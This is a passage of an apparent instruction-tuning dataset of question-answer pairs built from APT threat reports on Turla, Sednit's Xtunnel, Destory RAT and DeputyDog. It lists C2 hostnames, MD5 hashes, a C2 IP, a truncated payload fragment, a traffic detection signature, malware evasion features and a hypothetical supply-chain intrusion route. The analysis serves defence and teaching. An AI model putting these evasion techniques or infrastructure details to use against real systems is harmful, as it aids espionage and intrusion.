technical vulnerability [7, 17, 41, 50], no common system exists for ranking the sophistication of targeted e-mail attacks. TTI allows us to gain insights into the relative sophistication of social engineering and malware leveraged against CSOs.\nA key to the success of our study is a unique methodology, combining qualitative and technical analysis of\ne-mails and their attachments with fieldwork (e.g. site visits) and interviews with affected CSOs. This methodology, which we describe in more detail in Section 3, allows us to both accurately rate the level of targeting of email messages by interfacing with CSOs participating in our study (Section 4.2), and understand the relative technical sophistication of different malware families used in the attacks (Section 4.3). By combining the strengths of our qualitative and quantitative analysis, we are able to accurately understand trends in terms of social engineering and technical sophistication of politically-motivated targeted malware threats faced by CSOs.\nOur study makes the following observations, which have implications for security strategies that CSOs can employ to protect themselves from targeted malware:\nAttachments are the primary vector for email based targeted malware. More than 80% of malware delivered to Tibet-related organizations in our study and submitted to us is contained in an e-mail attachment. Further, for 2 of the 3 Tibetan organizations in our study (with at least 40 submitted e-mails), simply not opening attachments would mitigate more than 95% of targeted malware threats that use email as a vector.\nTargeted malware technical sophistication is low. Social engineering sophistication is high We find that the technical sophistication of targeted malware delivered to CSOs in our study is relatively low (e.g., relative to commercial malware that has been found targeting CSOs and journalists [35,36,38] and conventional finan-cially motivated malware), with much more effort given to socially engineering messages to mislead users. This finding highlights the potential for education efforts focused on changing user behaviours rather than high-cost technical security solutions to help protect CSOs.\nCSOs face persistent and highly motivated actors. For numerous malware samples in our study we observe several versions of the software appearing over the course of our four year study. These multiple versions show evidence of technical improvements to complement existing social engineering techniques.\nSince the start of our study we have participated in a series of workshops with the participating Tibetan organizations to translate these results into a training curriculum. Specifically, we have educated them about how to identify suspicious e-mail headers to identify spoofed senders and demonstrated tools that can be used to check e-mailed links for malware and drive-by-downloads.\nThe rest of the paper is structured as follows. Section 2 presents relevant background on targeted malware and attacks on CSOs. Our data collection methodology is described in Section 3. We describe our targeting and technical sophistication metrics as well as how we combine them to produce the Targeted Threat Index (TTI)\nin Section 4. Training and outreach implications of our work are discussed in Section 5. We present related work in Section 6 and conclude in Section 7.\n\nQuestion: How does the methodology used in the study to characterize targeted malware campaigns against CSOs contribute to a deeper understanding of these threats? What are the key components of this methodology?\n\nAnswer:",
    "output": "The methodology used in the study combines qualitative and technical analysis of emails and their attachments with fieldwork and interviews with affected CSOs. This approach allows for accurate rating of the level of targeting of email messages through direct interaction with participating CSOs and understanding the relative technical sophistication of different malware families used in the attacks. By integrating qualitative and quantitative analysis, the methodology provides a comprehensive view of trends in social engineering and technical sophistication of politically-motivated targeted malware threats faced by CSOs.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Operation DeputyDog: Zero-Day (CVE-2013-3893) Attack Against Japanese Targets\nFireEye has discovered a campaign leveraging the recently announced zero-day CVE-2013-3893. This campaign, which we have labeled 'Operation DeputyDog', began as early as August 19, 2013 and appears to have targeted organizations in Japan. FireEye Labs has been continuously monitoring the activities of the threat actor responsible for this campaign. Analysis based on our Dynamic Threat Intelligence cluster shows that this current campaign leveraged command and control infrastructure that is related to the infrastructure used in the attack on Bit9.\nQuestion: How did the threat actors behind Operation DeputyDog leverage the zero-day vulnerability CVE-2013-3893, and what was the significance of the command and control infrastructure used in this campaign?",
    "output": "Answer: The threat actors behind Operation DeputyDog exploited the zero-day vulnerability CVE-2013-3893 to launch a campaign targeting organizations in Japan. This campaign began as early as August 19, 2013. The significance of the command and control infrastructure used in this campaign lies in its connection to the infrastructure employed in the attack on Bit9. This indicates that the same threat actor or group was likely involved in both attacks, highlighting the importance of monitoring and analyzing command and control infrastructure to understand the broader scope of an adversary's operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Appendix A: C&C hostnames\nmay2008.dyndns.info menu.dyndns.biz\nflashsoft.no-ip.biz monagameel.chickenkiller.com hatamaya.chickenkiller.com powerhost.zapto.org helpme.no-ip.biz mjed10.no-ip.info good.zapto.org hint.zapto.org hint1.zapto.org natco1.no-ip.net natco2.no-ip.net natco3.no-ip.net natco4.no-ip.net loading.myftp.org skype.servemp3.com test.cable-modem.org idf.blogsite.org javaupdate.no-ip.info lokia.mine.nu\nwww.hint-sms.com\nowner.no-ip.biz  remoteback.no-ip.biz ramadi.no-ip.biz\nThe likelihood that there are more names involved is large. There is for example a domain natco5.no-ip.net which resolves to the same IP's as the rest of the series, but we have not seen the malware which uses it \u2013 yet.\nBig Headline: Appendix C: MD5 list, main cluster\nMD5 A5DE87646EE943CD1F448A67FDBE2817 F982401E46864F640BCAEDC200319109 EC5B360F5FF6251A08A14A2E95C4CAA4 97576FA7A236679DBE3ABE1A4E852026 C1EC435E97A4A4C5585392D738B5879F 2559FE4EB88561138CE292DF5D0E099F 0ABF3FA976372CBC8BF33162795E42A8 1f1e9958440d773c34415d9eb6334bcebc8b51d51e442e2af8c86e70c8adf4 31F96ADD841594D35E6E97376114E756 6E416C45A833F959A63785892042595A 0DC102CFB87C937EEFFE01A06F94E229 B7DF947B4A67A884C751840F83C4405E 2EB1503751A7C74890096B1837C7BD81 C21D7165B25CAF65D7F92FF758C1B5B1 0A67F9CC30083AFB7E1F8295AE152BB6 15FC009D9CAAA8F11D6C3DA2B69EA06E D9D1B0C467FA4999DEF6CD53447F1221 E9823B61E6CE999387DE821DFBF6E741 2AAD951DBECB6D4715B306B337CA5C34 ED53831468DDF4220E1DC3C3398F7F39 66DDF27517985A75B2317231B46A6F62 86BE5F0D2303FB4A8A8E297A53AC0026 A1187DE4C4B88E560D46940B820A6228\nn\nBased on the provided list of Command and Control (C&C) hostnames and MD5 hashes, how would you determine if a new hostname belongs to the same threat actor? Explain the methodology and reasoning behind your approach.",
    "output": "To determine if a new hostname belongs to the same threat actor, you would need to analyze several factors. First, observe the naming patterns and domains used in the existing C&C hostnames. For example, many of the hostnames use dynamic DNS services like 'no-ip.biz', 'zapto.org', and 'dyndns.info'. Additionally, some hostnames follow a sequential pattern, such as 'natco1.no-ip.net', 'natco2.no-ip.net', etc. By identifying these patterns, you can infer that a new hostname like 'natco5.no-ip.net' likely belongs to the same threat actor because it follows the established naming convention and resolves to the same IP addresses as the others. Furthermore, cross-referencing the IP addresses associated with known C&C servers can provide additional confirmation. This methodology relies on recognizing consistent behaviors and infrastructure usage by the threat actor.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: THE 'UPDATE?' COMMUNICATIONS\nHyperText\t Transfer Protocol (HTTP)\t POST 'Update?' requests were sent to both\t 'path.alyac.org' and\t 'update.alyac.org' from compromised\t computers.\t Two request\t formats were observed; Variant A (shown in Figure 3) in which\t the file path\t requested\t was '/update?product=windows', and Variant B (shown in Figure 4) in which\t the file path\t requested\t was '/update?id=number', where number refers to\t an eight\t digit hexadecimal number that\t changes between requests.\t The domain 'path.alyac.org' only received Variant\t B requests,\t while both variants were sent to\t 'update.alyac.org'.\nMedium Headline: FIGURE 4: VARIANT B COMMUNICATIONS\nThe format\t of\t Variant A is\t identical to the communications generated by\t the Destory RAT\t used in the SK Communications hack26.\t The format\t of\t Variant\t B is\t identical to\t the communications generated\t by\t malware that\t uses the callback domain 'gm1.network\u00adsec.net'27 .\nBoth\t variants are associated with the Destory RAT\t family of malware that dates back at least as far as January\t 200728 and\t has been used in several major targeted attacks.\n26 For a detailed\t analysis\t of the Destory RAT used in the SK Communications hack (including\t a complete list of deobfuscated strings) refer to the Command Five paper 'SK Hack\tby an Advanced Persistent Threat'. (Command\t Five Pty Ltd, 2011)\n27 Malware detected as 'Troj_Inject.AMR' submits HTTP\t POST requests\t to 'gm1.network\u00adsec.net/update?id={value}'. The domain 'gm1.network\u00adsec.net' is\t a known callback of malware detected as Backdoor:Win32/Thoper.A. (Mendoza, 2011) (Wong, 2011)\n28 The Destory RAT with MD5 hash '70CD C9A2\t D9CC 276B\t C5D1 D47D 21FB\t 24DF'\t was compiled on 3\tJanuary 2007.\nThe Destory RAT family\t includes malware that is detected as:\n\u0141 Backdoor.Sogu,\n\u0141 Backdoor:Win32/Thoper.A29,\n\u0141 Trojan.Downloader:Win32/Thoper B30 .\nThe observed\t communications to the 'alyac.org' subdomains all occurred on TCP port 80, however, a variety\t of ports (TCP\t ports 8080,\t 443,\t 12345\t etc.) have been used by this particular family\t of malware for similar requests.\t The port\t used depends on how the malware is configured.\nConnection attempts from\t each of\t the compromised computers occurred frequently while the computers were powered on.\t For example, one computer connected at 16 second intervals and another approximately\t every 200 seconds\t (\u00b115\t seconds). Three HTTP POST\t requests were submitted\t during each\t connection, each approximately\t one second apart.\nThe following malformed user\u00adagent31 is\t present\t in the HTTP\t POST\t requests of\t both variants (spaces shown here as '\u00b7'):\n'Mozilla/4.0\u00b7(compatible;\u00b7MSIE\u00b76.0;\u00b7Windows\u00b7NT \u00b75.1;SV1;'\nThis\t user\u00adagent is consistent with that which may\t be generated by\t version 6.0 of the Microsoft Internet Explorer web browser running on the Microsoft\t Windows\t XP\t OS,\t except\t that\t it\t is missing\t a closing\t bracket after the last semicolon and a space after the second to last semicolon. This malformed\t user\u00adagent\t is\t hardcoded into\t the malware and\t can be used as a signature to detect\t the communications.\nFour custom headers are also\t present in the HTTP requests:\t 'X\u00adSession',\t 'X\u00adStatus',\t 'X\u00adSize', and 'X\u00adSn'. For some malware in the Destory\t RAT family\t not all of\t these headers will be present.\n29 The Destory RAT with MD5 hash '5FCE 1FC1\t 8283 D76C 396A 3CCC 64BD BBDE'\t is detected by antivirus software as both Backdoor.Sogu and\t Backdoor:Win32/Thoper.A. This\t malicious\t file is\t identical\t to that used\t in the SK\t Communications\t hack\t except for its configuration. (Hispasec Sistemas, 2011)\n30 The Destory RAT with MD5 hash '7543 64D9\t DB70 2DC7 1532 7B40 BF97 E556'\t is detected\t by antivirus\t software as both Backdoor.Sogu and\t TrojanDownloader:Win32/Thoper.B. (Hispasec Sistemas, 2011)\n31 User\u00adagents\t are used in HTTP\t communications to tell webservers which OS and\t web browser their clients are using, so they can serve compatible webpages.\n\nAnswer this question based on the above context: How does the Destory RAT family of malware, used in the SK Communications hack, communicate with its Command and Control (C2) servers? Describe the two variants of HTTP POST 'Update?' requests observed and their significance.",
    "output": "The Destory RAT family of malware communicates with its C2 servers using HTTP POST 'Update?' requests sent to specific subdomains like 'path.alyac.org' and 'update.alyac.org'. Two variants of these requests were observed: Variant A, where the file path requested was '/update?product=windows', and Variant B, where the file path requested was '/update?id=number', with 'number' being an eight-digit hexadecimal number that changes between requests. Variant A is identical to the communications generated by the Destory RAT used in the SK Communications hack, indicating a direct link to that specific malware. Variant B is identical to communications generated by malware using the callback domain 'gm1.network-sec.net', suggesting a broader use of similar malware techniques. Both variants are significant because they provide insights into the communication patterns and potential identification methods for the Destory RAT family, which has been involved in several major targeted attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Step 5. Second stage payload\nThe second-stage payload (<558bec83ec3053e8a40200008945fc8b45fc83c030508b4dfc8\u2026 ) appears to be a simple hex-encoded blob (no XOR decoding needed). Converting it from hex to binary and running the UNIX strings command on it yields the following interesting artifacts that hint what the next stage will be\u2026\nQSVW\nntdll.dll\nkernel32.dll\nLoadLibraryA\nGetProcAddress\nNtAllocateVirtualMemory\nNtProtectVirtualMemory\nGetCurrentProcess\nQSVW\nfff^\nHJON\nr|kw\nijxip7}uu\nUvx}Up{kxk`X\n^|mIkvzX}}k|\npm|_pu|\nKmuPwpmLwpzv}|Jmkpw~\n^|m\\wopkvwt|wmOxkpx{\nMqk|x}\n^|mIkvz|jjPtx~|_pu|Wxt|X\nNkpm\n8Mqpj9ikv~kxt9z-wwvm9{|9klw9pw9])J9tv}|\n,Kpzqg\n7m|am\nY7}xmx\n7kjkz\njZp'\n!zjt\nMedium Headline: HTTP/1.1 200 OK\nDate: Thu, 10 Aug 2017 06:59:01 GMT\nServer: Apache/2.4.10 (Debian)\nContent-Length: 5\nContent-Type: text/html; charset=UTF-8\nFalse\nWe believe that the actors would not invoke remote control unless they had ruled out nosy researchers. Based on Google searches identifying the C2 IP address ( (<https://community.rsa.com/external-link.jspa?url=https%3A%2F%2Fcommunity.riskiq.com%2Fsearch%2F137.74.224.142>)137.74.224[.]142) as an established Minecraft (multiplayer game) server, we suspect it is possible that the host has been compromised by the perpetrators and is being used without the permission of the owner. Other previous URL resolutions may be associated with prior customers of the virtual private server (Figure 7).\nThanks to (<https://community.rsa.com/people/Gl8LOTl4A2rCbPZkifuse3cHH75XbzVWfnhIYrQRH4A=>)Kent Backman, (<mailto:Kevin.Douglas2@rsa.com>)Kevin.Douglas2@rsa.com, and (<https://community.rsa.com/people/eljiuOGik1LMVgyOmpJffeA3CdD1U3ruX0YyuZNcnJY=>)Christopher Elisan for all their contributions to this research.\nAnswer this question: In the context of the RSA_Russian-Bank-Offices-Phishing-Wave(08-18-2017) report, how does the second-stage payload operate, and what techniques are employed to identify its functionality? Additionally, explain the significance of the HTTP response and the potential implications of the identified C2 IP address.",
    "output": "The second-stage payload in the RSA_Russian-Bank-Offices-Phishing-Wave(08-18-2017) report appears to be a simple hex-encoded blob that does not require XOR decoding. By converting it from hex to binary and using the UNIX strings command, several interesting artifacts are revealed, including references to system libraries like 'ntdll.dll' and 'kernel32.dll', along with functions such as 'LoadLibraryA', 'GetProcAddress', and 'NtAllocateVirtualMemory'. These artifacts suggest that the payload is designed to interact with low-level system functions, potentially to load additional malicious modules or manipulate memory protections.\\n\\nThe HTTP response indicates a successful connection with a status code of '200 OK', served by an Apache server. The content length is minimal, suggesting that the response might be a simple acknowledgment rather than delivering substantial data. The C2 IP address (137.74.224[.]142) identified in the report is associated with an established Minecraft server, leading to the suspicion that the server has been compromised and is being used without the owner's permission. This highlights the tactic of using legitimate but compromised infrastructure to evade detection and attribution.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: The man behind the curtain\nOne of the most advanced and prolific known threat actors is the Turla group. They have existed in some shape or form since at\nleast 2006, but some speculate that their true origins may be as much as a decade earlier. It's widely accepted that Turla is a state-sponsored actor originating from Russia. What makes Turla so fascinating is the group's attention to detail, operational security, and advanced tactics for victim data exfi ltration. During one specific incident in November 2012, the Turla group showed their willingness to engage in deception tactics when cornered.\n11 The private TigerMilk report was pushed to Kaspersky Intel Report subscribers in November 2015.\n12 Serial number: 5e 6d dc 87 37 50 82 84 58 14 f4 42 d1 d8 2a 25.\n13 12 June 2010.\nTurla compromised a handful of victims during this campaign, but one particular European victim proved especially enticing. The group had deployed their typical fi rst-stage malware, Wipbot, on the victim's system and began their normal routine of collection and monitoring. At some point, the victim became suspicious and decided to engage their incident response (IR) team to investigate their network and determine the source of nefarious activity. The IR team began their normal process of surveying the system and running various investigative tools, however, they did not pull the system offl ine. Turla became aware that they would soon be discovered. At this point, most actors would simply uninstall their malware from the victim and move on. Instead, Turla decided to have a bit of fun with the IR team in an attempt to cover their tracks.\nThey proceeded to utilize Wipbot to download and install a second-stage binary. But this was no ordinary Turla malware, rather they installed a somewhat rare, already compiled piece of Chinese malware by the name of Quarian. The Quarian malware communicated back with infrastructure located in Beijing, which was neither under Turla's control nor related to previous Turla operations. They then proceeded to uninstall the Wipbot malware and erase their tracks from the victim systems.\nThis proved to be a great move on their part, as the IR team spent countless hours tracking down the Quarian malware and assuming the victim had been targeted by a Chinese-based APT group. Because they used a lesser-known piece of malware, the investigators first had to identify the family, then dig through the sprawling infrastructure in search of some level of attribution. All of this work was obviously pointless and served as a fantastic smoke screen for Turla's retreat.\n\nWhy did the Turla group decide to deploy the Quarian malware instead of simply uninstalling their own malware when they realized they were about to be discovered? Explain the strategic advantage of this action.",
    "output": "A: The Turla group decided to deploy the Quarian malware instead of simply uninstalling their own malware because it served as a deceptive tactic to mislead the incident response (IR) team. By using a lesser-known piece of Chinese malware that communicated with infrastructure in Beijing, Turla created a smokescreen that led the IR team to believe the attack was conducted by a Chinese-based APT group. This diversion bought Turla time to erase their tracks and retreat without detection, effectively covering their involvement in the attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Profiting from the Product\nSo who is most likely to profit from the information being gathered through these attacks? The political, economic and intelligence reporting has a clear audience, but deciding who the commercial intelligence should be passed to presents a more taxing problem. Which companies receive this kind of assistance? The answer may lie in the particular brand of capitalism which China practices.\nChina is no longer the planned economy it once was and some Chinese companies are now among the largest in the world. But this is not capitalism as we know it and these companies are far from being truly 'private'. All the largest companies in China are State Owned Enterprises (SOEs) in which the state is the largest (or only) shareholder. The state can and does change company board members at will and members of the armed forces are routinely brought into senior management roles. But in addition to simply appointing the heads of companies, the Party also has a final say over the strategic direction of each company, business planning processes and the size of salaries paid to employees. After all, if companies are seen to be profiting unfairly at the expense of the workers that could lead to political unrest.\nThere are currently 117 companies classed as SOEs and under the control of the State-owned Assets Supervision and Administration Commission (SASAC), the primary shareholder in these companies. To give some idea of the scale of SOEs, they now comprise 80% of the value of China's stock market. Yet in the last 10 years, the number of SOEs has almost halved as SASAC has pushed through mergers of companies with similar strengths to consolidate the overall power of these companies in various sectors and make them more competitive outside China. SASAC works alongside the Communist Party's Organisation Department, which acts as a human resources department and makes certain that those running these businesses care every bit as much (if not more) about pleasing Party bosses as they do about their success in business.\nIn addition to the Party's input to the strategies pursued by these companies, the state is also instrumental in guiding them to financial success by other means. Most significantly it arranges cheap lines of credit, allowing companies to borrow money for expansion; and provides a ready-made market for the company \u2013 the Party has the ability to block competitors from any industry or to introduce policies which make competitors more expensive. The state can also provide considerable human resources if a particular company or industry needs to increase production suddenly: large pools of labour in China work for the state rather than companies and so form a mobile and flexible workforce. But if at the end of the day the products or services a company offers are outdated or of poor quality, that company will fail. The Party has a vested interest in every SOE performing well\nand becoming a national or global champion in its sector, so it may be willing to extend help through the leveraging of intelligence sources. Note the list of companies and sectors in Appendix A: it is clear that the companies on the list all have interests in areas which will support the Five Year Plan and Indigenous Innovation.\nMedium Headline: Hypothetical Case Study: Aircraft Construction\nOne good example of how the Party could use its intelligence collection methods to benefit an SOE is seen in the case of COMAC16 , the Commercial Aircraft Corporation of China. COMAC is currently trying to build a large aircraft to compete with the likes of Boeing and Airbus. In an excellent in-depth paper on Indigenous Innovation17 , the US Chamber of Commerce and strategic consulting firm ACPO Worldwide18 detail the desire of China to build an aircraft since the crash (and subsequent re-engineering) of a Pakistan Airlines Boeing 707 in 1971. The re-engineered plane named the Yun-10 was a complete failure as China did not at that time possess all the necessary technology required to make it a success.\nWith a rise in the use of air transport within China, domestic carriers are being forced to buy foreign aircraft at enormous cost, whereas a home-grown aircraft could be sold much more cheaply. The COMAC C91919 is designed to rival the Boeing 737 and Airbus A320 and planned to be operating by 2015, and to encourage foreign companies to share their technology, China has promised access to the market. Companies including Parker Aerospace, General Electric, Honeywell and Goodrich have all signed up. Whether they benefit from this move in the long term, or are instead encouraged to leave once they have been bled dry of useful information, remains to be seen. But for all the help they are getting, Chinese engineers are not yet able to access the technology developed by Boeing and Airbus, or by large aeroplane engine suppliers such as Rolls Royce.\nWe know therefore that there is intent to build a domestic airliner and that previously re-engineering has been attempted. Technology transfer is ongoing at the moment, but how (hypothetically) could computer network exploitation attacks help China achieve its goal?\nIt is hard to imagine that a project of that size would not be given some assistance by the government, given that there is national pride at stake. If intelligence or military resources could be directed against Boeing and Airbus networks there would be some very quick wins. Not only could design documents and technical information be stolen en masse and without the need to actually deal with the company, but there could be some weak links in the supply chains of these companies which would help an attacker to penetrate their networks.\nFirst, smaller suppliers would provide an easy target from where attacks could be launched directly, spoofing emails with Trojans to improve the chance of recipients opening them. Second, both companies have facilities in China, presumably with network connectivity which may provide a direct route into the main network. There are also Chinese citizens working for the two target organisations who could be tasked to download something nefarious or plug in a USB drive to help their country.\n16\n17\n18\n19\nFinally all large organisations share large amounts of their data with third parties such as law firms and consultants; companies that may not protect their networks as effectively as the target company. These 'data aggregators' can present a major vulnerability in the security of sensitive data.\nThe end goal of the project is to sell the aircraft worldwide and to undercut the established suppliers. COMAC could achieve this by using lines of credit at favourable rates from the Chinese banks that would help to make deals cheaper for airlines purchasing aircraft. But what really helps these companies undercut foreign rivals is that they have not needed to spend huge amounts of money on R&D to get the plane off the ground in the first place.\nIf designs for the body of the aircraft could be stolen along with aerodynamic information it would cut development time by years; and by billions of dollars. If stolen engine designs were also used that would cut costs further still. Even if the companies from whom this technology had been stolen were able to see that it had been stolen, they would only be able to take limited action in response; and to do so could put at risk their continued ability to operate or sell in China.\nThe list of SOEs in \"Appendix A\" is dominated by transport companies (rail, aerospace and shipping), energy (petrochemical, nuclear, power generation/distribution, hydro), telecoms (mobile, infrastructure), manufacturing, extraction/metals (coal, iron, steel, minerals, aluminium) and trading companies. If a company has been targeted by Chinese state sponsored cyber espionage, we believe that any information stolen probably ends up in one of these SOEs. While China is able to manipulate market conditions in various ways to help SOEs prosper, nothing would contribute more to their growth and success than a supply of inside information about the activities of their competitors and customers.\nRead the text above and answer this question: How might the strategic use of stolen information help COMAC undercut established aircraft manufacturers like Boeing and Airbus?",
    "output": "Stolen information, such as designs for aircraft bodies and engines, could significantly reduce development time and costs for COMAC. By avoiding the need for extensive R&D, COMAC could save years and billions of dollars. Additionally, favorable lines of credit from Chinese banks could make deals cheaper for airlines purchasing COMAC aircraft. This combination of reduced costs and financial incentives would allow COMAC to undercut established competitors like Boeing and Airbus, making their aircraft more attractive to potential buyers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: TLS Encryption (April 2014)\nA major feature introduced in April 2014 is the encryption of the communications with the C&C server with the Transport Layer Security (TLS) protocol (<>)[25]. These new Xtunnel binaries are statically linked with OpenSSL 1.0.1e \u2014 a version released in February 2013. Inside the TLS encapsulation, Xtunnel network protocol for tunneling remains the same (including the RC4 encryption).\nThe TLS certificate used by the C&C server is not verified by Xtunnel, which means anyone could play the role of Xtunnel C&C server.\nSmall Headline: HTTP Proxy Connection (February 2015)\nSome organizations force their computers to pass through an HTTP proxy to access the Internet. Malware running on such machines therefore cannot contact the C&C server directly, but has to pass through the proxy. Sednit developers took that into account by creating special Xtunnel versions with HTTP proxy awareness.\nIn these binaries, Xtunnel first tries to retrieve the Internet Explorer proxy configuration by calling the Windows API function WinHttpGetIEProxyConfigForCurrentUser (<>)[26]. In the event that no information can be retrieved, it uses the hardcoded address 10.1.1.1:8080, which is the default address of the Squid caching proxy (<>)[27]. This intention is clearly stated in the PDB path in one of the samples: xaps_through_squid_default_proxy.\nOnce a proxy IP address has been chosen, Xtunnel uses the HTTP CONNECT method (<>)[28] to reach its C&C server.\nSmall Headline: Command Line Parameter Parser (April 2015)\nTo gain in flexibility and manage novel features, in April 2015 Xtunnel developers introduced a command line parameter parser. This parser accepts the parameters described in Table 5.\nTable 5. Xtunnel Parameters\nIn most Xtunnel samples, the parser actually processes a command line hardcoded in the binary, without even looking for input parameters. Here are some examples of such command lines found in some samples:\nThe proxy IP addresses shown in these examples do not correspond to any known default proxy address, indicating that these binaries were likely compiled for specific targets.\nSmall Headline: HTTP Persistent Connection (June 2015)\nIn June 2015, a novel way to connect to the C&C server was introduced: an HTTP persistent connection (<>)[29]. When this feature is enabled, Xtunnel exchanges data with its C&C server over the HTTP protocol (encapsulated in TLS protocol), probably as a way to bypass firewalls.\nTo open such a persistent connection, an HTTP GET request is encapsulated in TLS protocol and sent to the C&C server. This request comes with the HTTP header Connection: keep-alive to enable the persistent connection.\nAnother HTTP request header hardcoded in Xtunnel is Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4, which interestingly contains the language code ru-RU. This header may have been copied from a request made from a computer whose default language is Russian.\nSmall Headline: Code Obfuscation (July 2015)\nIn July 2015, Xtunnel binaries changed drastically from a syntactic point of view, due to the introduction of code obfuscation. This obfuscation was applied only to Xtunnel-specific code, while statically linked libraries were left untouched. The method employed is a mix of classic obfuscation techniques, like insertion of junk code and opaque predicates (<>)[30].\nConsequently, Xtunnel binaries are now about 2 MB in size, while the previous non-obfuscated versions were about 1 MB with most of that being the statically linked OpenSSL library. The obfuscated version is, of course, much harder to understand and, to illustrate that, the following Figures show the control flow graph (CFG) (<>)[31] of a small Xtunnel function, before and after obfuscation.\nWhile the control flow has been heavily obfuscated, strangely the strings and data are kept in plain text. We speculate that the developers applied an (unknown) code obfuscation tool, which was enough to achieve their goal \u2014 probably bypassing some security products.\nMedium Headline: Conclusion and Open Questions\nWe believe Xtunnel to be of high importance to the Sednit operators, despite the questionable quality of the code as we discussed in the analysis. In particular, it is the only Sednit component we know with heavy code obfuscation. Additionally, the numerous features added over the last three years indicate an ongoing development effort.\nFinally, we would like to stress that our analysis is solely based on the capabilities found in the binaries. In particular, we do not have in-the-wild examples on how Xtunnel is deployed, and what kind of network traffic is usually forwarded.\nBig Headline: ClOSInG REMaRkS\nIn order to perform its espionage activities, the Sednit group mainly relies on two backdoors, Xagent and Sedreco, which were intensively developed over the past years. Similarly, notable effort has been invested into Xtunnel, in order to pivot in a stealthy way. Overall, these three applications should be a primary focus to anyone wanting to understand and detect the Sednit group's activities.\nNevertheless, the spying and pivoting capabilities of Sednit are not limited to the software described in this second part of our whitepaper. For example, they regularly deploy the following on target computers:\n\u2022 Password retrieval tools for browsers and email clients; some of these tools are custom, while others are publicly available (like the SecurityXploded tools (<>)[32])\n\u2022 Windows password retrieval tools, with custom builds of the infamous mimikatz (<>)[33] and some custom tools\n\u2022 A custom tool to take regular screenshots of the target computer\nMoreover, the Sednit group created numerous small executables to perform specific tasks, like copying or removing files. The developers seem therefore to closely follow the operational needs of the group, causing us to speculate that they are not outsiders paid for a one-time job, but fully-fledged members of the group.\nBig Headline: REfEREnCES\n1. The Washington Post, Russian government hackers penetrated DNC, stole opposition research on Trump, (<https://www.washingtonpost.com/world/national-security/russian-government-hackers-penetrated-dnc-stole-opposition-research-on-trump/2016/06/14/cf006cb4-316e-11e6-8ff7-7b6c1998b7a0_story.html?hpid=hp_rhp-banner-main_dnc-hackers-1145a-banner%3Ahomepage%2Fstory,>), June 2016\n2. The Wall Street Journal, Germany Points Finger at Russia Over Parliament Hacking Attack, , May 2016\n3. Reuters, France probes Russian lead in TV5Monde hacking: sources, -france-russia-cybercrime-idUSKBN0OQ2GG20150610, June 2015\n4. ESET VirusRadar, Zero-day, -day\n5. ESET, Sednit Espionage Group Attacking Air-Gapped Networks, , November 2014\n6. Kaspersky, Sofacy APT hits high profile targets with updated toolset, -apt-hits-high-profile-targets-with-updated-toolset/, December 2015\n7. CrowdStrike, Bears in the Midst: Intrusion into the Democratic National Committee, -midst-intrusion-democratic-national-committee/, June 2016\n8. Trend Micro, Pawn Storm Espionage Attacks Use Decoys, Deliver SEDNIT, , October 2014\n9. FireEye, APT28: A Window into Russia's Cyber Espionage Operations?,\n10. GitHub, ESET Indicators of Compromises,\n11. ESET, Sednit espionage group now using custom exploit kit, , October 2014\n12. Microsoft Developer Network, Run-Time Type Information,\n13. Trend Micro, Pawn Storm Update: iOS Espionage App Found, -storm-update-ios-espionage-app-found/, February 2015\n14. 15. SQLite, SQLite, /\n16. Wikipedia, Cyclic redundancy check,\n17. W3C, The Multipart Content-Type,\n18. Microsoft Developer Network, How to Implement Icon Overlay Handlers, (v=vs.85).aspx\n19. Microsoft Developer Network, SYSTEMTIME structure, (v=vs.85).aspx\n20. Wikipedia, Lempel\u2013Ziv\u2013Welch, %E2%80%93Ziv%E2%80%93Welch\n21. 4coder, LZW Algorithm Implementation, /\n22. 23. Spiegel, Cyberangriff auf das Parlament: Bundestag best\u00e4tigt Abfluss von E-Mail-Daten, , June 2015\n24. PDB Files,\n25. Internet Engineering Task Force, The Transport Layer Security (TLS) Protocol,\n26. Microsoft Developer Network, WinHttpGetIEProxyConfigForCurrentUser function, (v=vs.85).aspx\n27. Squid, Home Page, /\n28. Wikipedia, HTTP CONNECT tunneling, #HTTP_CONNECT_tunneling\n29. Wikipedia, HTTP persistent connection,\n30. Wikipedia, Opaque predicate,\n31. Wikipedia, Control flow graph,\n32. SecurityXploded, Home Page, /\n33. mimikatz, GitHub page,\nLast updated 2016-09-07 19:38:00 EDT\n\nHow did the Sednit group modify Xtunnel in June 2015 to potentially bypass firewalls, and what additional clue did they leave behind regarding their possible origin?",
    "output": "A: In June 2015, the Sednit group introduced a feature in Xtunnel to establish an HTTP persistent connection with the C&C server. This connection is encapsulated in the TLS protocol and uses the HTTP GET request with the header 'Connection: keep-alive' to maintain the persistent connection, likely as a method to bypass firewalls. Additionally, another HTTP request header hardcoded in Xtunnel is 'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4', which includes the language code 'ru-RU'. This suggests that the request might have been copied from a computer whose default language is Russian, providing a clue about the possible origin of the Sednit group.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nSmall Headline: Psychological operations\nNorth Korea continues to be a master of propaganda and deception and leverages the cyber realm for psychological operations. Modern North Korean psychological operations tactics include distribution of propaganda via traditional media outlets, websites, and social media. Many of these psychological operations campaigns are politically focused.190 According to Dr. Andrei Lankov, the North Korean government has \"very rational and highly successful manipulators who usually get what they want by outsmarting everybody else in the process.\"191\nThe regime's Unit 204 is responsible for cyber-psychological operations. These operations are PSYOP tailored for the cyber arena. In order to be successful, cyber-psychological campaigns require speed, precision, and creativity. These campaigns leverage the phenomenon of viral, unverified news stories that tend to rapidly propagate via social media, mobile text messaging, and other electronic communications. This phenomenon creates an arena for strategic propagation of both fact and fiction for the purposes of sentiment manipulation. Such messages may be used for\nSuch messages can be used for recruitment, cyber mobilization, and to instill fear in a target population.\n185 